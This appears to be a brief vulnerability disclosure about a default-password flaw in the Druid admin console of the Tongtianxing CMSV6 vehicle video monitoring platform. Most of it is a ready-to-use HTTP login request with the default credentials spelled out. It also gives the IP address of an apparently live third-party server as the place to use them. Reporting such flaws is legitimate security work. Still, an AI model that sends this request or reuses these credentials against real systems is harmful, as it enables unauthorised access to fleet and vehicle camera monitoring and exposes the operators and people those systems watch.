Dongguan Tongtianxing Software Technology Co., Ltd.'s Vehicle Management System has a default password vulnerability that may affect the system

There is a default password vulnerability in the Druid of the Tongtianxing CMSV6 in car video monitoring platform

developer：http://www.g-sky.cn/





![image-20240327161651680](https://oss.wencha.cfd/img/20240327161653.png)

POC：

```http
  POST /druid/submitLogin HTTP/1.1
  Host: {{Hostname}}
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
  Accept: text/plain, */*; q=0.01
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  X-Requested-With: XMLHttpRequest
  Content-Length: 42
  Connection: close
  Cookie: JSESSIONID=4F7D8A071EAC19E6196D1775D84D2F8D

  loginUsername=ttx&loginPassword=ttx123456.
```



Referer：

http://15.204.209.106/808gps/login.html

![image-20240327160402075](https://oss.wencha.cfd/img/20240327160403.png)

http://15.204.209.106/druid/login.html



use：loginUsername=ttx&loginPassword=ttx123456.

![image-20240327160626906](../AppData/Roaming/Typora/typora-user-images/image-20240327160626906.png)

